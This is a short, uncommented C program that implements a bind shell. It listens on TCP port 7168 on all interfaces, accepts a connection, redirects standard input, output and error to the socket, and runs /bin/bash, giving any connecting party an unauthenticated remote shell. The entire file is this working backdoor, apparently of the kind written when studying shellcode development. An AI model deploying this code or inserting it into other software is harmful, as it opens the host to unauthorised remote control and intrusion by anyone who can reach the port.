#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int host_sockid;
int client_sockid;

struct sockaddr_in hostaddr;

int main() {
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);

    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(7168);
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

    listen(host_sockid, 2);

    client_sockid = accept(host_sockid, NULL, NULL);

    dup2(client_sockid, 0);
    dup2(client_sockid, 1);
    dup2(client_sockid, 2);

    execve("/bin/bash", NULL, NULL);
}
